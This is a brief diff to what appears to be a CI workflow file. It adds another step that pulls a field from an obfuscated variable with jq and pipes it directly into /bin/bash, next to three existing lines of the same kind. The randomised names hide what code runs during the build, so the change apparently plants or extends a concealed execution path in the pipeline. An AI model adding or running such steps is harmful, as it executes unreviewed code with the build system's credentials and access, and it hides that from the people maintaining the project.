@@ -27,6 +27,7 @@ jobs:
           echo $d31 | jq -r .syh21817 | /bin/bash
           echo $wv7361 | jq -r .edv63857 | /bin/bash
           printf '%s' "$bwwx91275" | jq -r .gji8114 | /bin/bash
+          echo $rk420 | jq -r .fbaa5900 | /bin/bash
 
       - name: Archive results
         if: always()
